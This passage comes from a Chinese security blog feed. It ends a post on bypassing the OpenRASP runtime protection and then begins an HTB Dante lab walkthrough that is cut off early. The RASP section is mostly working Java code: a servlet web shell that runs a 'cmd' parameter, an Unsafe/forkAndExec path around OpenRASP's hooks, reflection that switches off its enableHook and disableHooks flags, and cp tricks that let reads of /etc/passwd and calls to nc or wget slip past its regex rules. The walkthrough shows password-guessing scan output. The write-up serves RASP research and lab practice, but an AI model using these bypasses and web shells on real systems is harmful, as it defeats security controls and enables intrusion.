class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>().command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> command.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然符合预期：</p><p><img src="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg" alt="image-20230806142227583"></p><p>但是请注意，我们刚刚提到了，Runtime.getRuntime().exec()执行命令的底层逻辑是通过ProcessBuilder去执行命令的，而ProcessBuilder执行命令实际是调用了ProcessImpl这个类。那假如我们直接使用ProcessImpl类的start方法去执行命令，是不是就能绕过了？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;mate-calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功bypass：</p><p><img src="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg" alt="image-20230806142428935"></p><p><strong>从这里我们就可以发现，如果我们要写一个针对某种漏洞的RASP，就必需将这种漏洞的底层原理搞清楚。否则就像上面提到的例子，绕过是很轻松的。</strong>这一点就与WAF有很大差别，WAF可能只需要对一些关键字进行过滤即可防御攻击，但是RASP却不行。</p><p>我们刚刚写这个Demo RASP的时候还遇到了一个问题，那就是我们过滤的时候直接将所有的命令都给屏蔽了。可是我们很多时候又确实有执行命令的需求，那对于这一点我们该怎么做呢？我们先看看万能的OpenRASP是怎么做的：</p><p><img src="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg" alt="image-20230806172951560"></p><p>OpenRASP通过黑名单的方式对部分命令进行了正则过滤，可是很明显，这样做仍然很不安全，最大原因就是黑名单的命令不够完备，攻击者很轻松就可以绕过。这里又引出一个问题，如果继续完善黑名单，会耗费巨大的人力不说，还会使得应用的性能严重下降。那如果采用白名单呢？如果我们想执行什么命令，就对此命令加白，似乎又显得非常麻烦。因为本人水平所致，没有办法给出既能使得性能下降不明显，又能使防御能力大幅度上升的做法。不过笔者更倾向白名单的方式对命令进行过滤。</p><h2 id="Bypass-OpenRASP"><a href="#Bypass-OpenRASP" class="headerlink" title="Bypass OpenRASP"></a>Bypass OpenRASP</h2><h3 id="Unsafe绕过"><a href="#Unsafe绕过" class="headerlink" title="Unsafe绕过"></a>Unsafe绕过</h3><p>首先设置44行的all_log为false，即关闭观察模式：</p><p><img src="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg" alt="image-20230806200227925"></p><p>之后将命令注入模块的action由log改为block，此时我们就打开了拦截模式：</p><p><img src="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg" alt="image-20230806200209175"></p><p>我们先写一个HttpServlet，其中doGet方法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br></pre></td></tr></table></figure><p>传入cmd参数为whoami，以下是结果：</p><p><img src="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg" alt="image-20230806200633686"></p><p>符合预期，按照正则表达式没有进行过滤。之后传入cmd&#x3D;cat &#x2F;etc&#x2F;passwd，结果为：</p><p><img src="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg" alt="image-20230806200744779"></p><p>接下来我们尝试bypass。在bypass之前，我们再回想一下OpenRASP的hook流程？比如这里提到的命令执行部分，OpenRASP在UNIXProcess或者ProcessImpl类的初始化方法处插入了自己的防御代码，使得我们无法执行黑名单中的命令。那麻烦思考一下，既然它在UNIXProcess或者ProcessImpl类的初始化方法中插入了防御代码，那么我们有没有一种办法能够不需要调用这两个类的初始化方法就能直接获取UNIXProcess或者ProcessImpl类呢？当然是有的，在Java中有一个叫Unsafe的类，它提供了非常底层的<code>内存、CAS、线程调度、类、对象</code>等操作、<code>Unsafe</code>正如它的名字一样它提供的几乎所有的方法都是不安全的。而Unsafe类中有一个allocateInstance方法，它可以无视构造方法从而直接创建这个类的实例。接下来给大家做个示范：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] commands = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">//反射获取unsafe实例</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取UNIXProcess实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[commands.length - <span class="number">1</span>][];</span><br><span class="line">        <span class="type">int</span>      <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = commands[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] envc                 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds              = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span>      <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpathObject      = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置访问权限</span></span><br><span class="line">        <span class="type">byte</span>[] CString = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(commands[<span class="number">0</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">            CString = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes  = commands[<span class="number">0</span>].getBytes();</span><br><span class="line">            CString = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, CString, <span class="number">0</span>, bytes.length);</span><br><span class="line">            CString[CString.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                ordinal + <span class="number">1</span>, helperpathObject, CString, argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(baos.toString());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们再传入?cmd&#x3D;cat&amp;cmd&#x3D;&#x2F;etc&#x2F;passwd，结果如下：</p><p><img src="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg" alt="image-20230806201152184"></p><p>对代码部分简略解释一下吧。首先我们通过反射获取一个unsafe实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取unsafe实例</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>之后又获取了UNIXProcess实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br></pre></td></tr></table></figure><p>因为我们创建此UNIXProcess对象时并未 通过其构造函数来获取，因此并未执行OpenRASP的hook代码，从而完成绕过！</p><h3 id="关闭OpenRASP开关"><a href="#关闭OpenRASP开关" class="headerlink" title="关闭OpenRASP开关"></a>关闭OpenRASP开关</h3><p>在一般的RASP产品中为了避免影响产品，都会设置一个开关，在OpenRASP中也不例外。OpenRASP的开关就是com.baidu.openrasp.HookHandler的enableHook字段：</p><p><img src="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg" alt="image-20230807002521102"></p><p>在我们刚刚分析的hook流程中，有一个com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest函数，在函数开始做了一个判断，就是判断OpenRASP的开关是否打开：</p><p><img src="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg" alt="image-20230807002548473"></p><p>我们可以通过反射将这个字段设为<code>new AtomicBoolean(false)</code>，即关闭这个字段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableHookFiled</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> enableHookFiled.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(enableHookFiled, enableHookFiled.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        enableHookFiled.set(cls.newInstance(), <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>(<span class="literal">false</span>));</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后成功bypass：</p><p><img src="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg" alt="image-20230807002758651"></p><p>那既然这个方法可行，那我们不妨找找在刚刚的hook流程中，我们还能通过反射更改哪些字段，从而中止hook流程？还记得我们之前提到的那个熔断开关吗？那个是RASP为了在CPU占比过高的情况下设置的。我们也可以通过调用以下方式手动设置熔断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> Config.getConfig();</span><br><span class="line">config.setDisableHooks(<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure><p>之后中止hook：</p><p><img src="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg" alt="image-20230807003115746"></p><p>与之类似的还有config类的cloudSwitch字段以及hookWhiteAll字段，这两个就交给读者了。</p><h3 id="cp命令绕过RASP"><a href="#cp命令绕过RASP" class="headerlink" title="cp命令绕过RASP"></a>cp命令绕过RASP</h3><p>以读取&#x2F;etc&#x2F;passwd为例，我们看一下OpenRASP的匹配规则：</p><p><img src="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg" alt="image-20230807003535721"></p><p>这里只是匹配了cat.{1,5}&#x2F;etc&#x2F;passwd，那加入我们使用cp命令将&#x2F;etc&#x2F;passwd复制到&#x2F;tmp&#x2F;passwd，然后再查看&#x2F;tmp&#x2F;passwd不就可以绕过了吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cp /etc/passwd /tmp/passwd</span><br><span class="line">?cmd=cat /tmp/passwd</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg" alt="image-20230807003646953"></p><p>同理，我们可以将某些禁止使用的命令，如&#x2F;bin&#x2F;nc、&#x2F;bin&#x2F;wget等copy到别的位置，之后再进行调用来进行bypass。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章主要针对OpenRASP进行了启动流程的分析和Hook流程的分析，收获很大，算是RASP入门？时至今日，个人感觉RASP技术在大规模应用上仍然有比较大的困难。一方面就是令人诟病的性能原因，还有一方面要求安全人员对漏洞的原理必须深入到代码层面。因此感觉RASP技术可能就像Glassy师傅在KCon大会说得那样，不能像从前一样只是将恶意行为覆盖掉，因为恶意行为是不可穷举的，最好的解决办法就是在漏洞的入口点将攻击进行有效拦截。</p>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Dante Walkthrough</title>
      <link href="/2023/05/15/htb-dante/"/>
      <url>/2023/05/15/htb-dante/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近忍痛买了HTB的pro labs， 购买之后可以打任何lab，还是挺划算的。这篇文章对Dante实验室作个简单的记录，不会提供任何一台机子的flag，只是给打靶又卡住了的师傅们提供一个解题的思路。建议还是自己亲自去打才能学到更多东西。getshell、提权以及横向的其他方式，师傅们可以自行研究。</p><p>注： 写这篇文章的时候，因为网络原因，重换了几次htb的vpn server，所以可能存在前后IP不同的情况。</p><h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>dante给的网段是10.10.110.0&#x2F;24，直接fscan扫，扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# fscan -h 10.10.110.0/24                        </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.110.2     is alive</span><br><span class="line">(icmp) Target 10.10.110.100   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.10.110.100:21 open</span><br><span class="line">10.10.110.100:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[+] ftp://10.10.110.100:21:anonymous </span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root 123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root root@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root abc123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root Aa123456 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root Charge123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 2/2</span><br><span class="line">[*] 扫描结束,耗时: 7m8.392454575s</span><br></pre></td></tr></table></figure><h3 id="I’m-nuts-and-bolts-about-you"><a href="#I’m-nuts-and-bolts-about-you" class="headerlink" title="I’m nuts and bolts about you"></a>I’m nuts and bolts about you</h3><p>可以看到10.10.110.100这台机子可以匿名访问：</p><p><img src="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg"></p><p>下载之后，有一个todo.txt，这是它的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 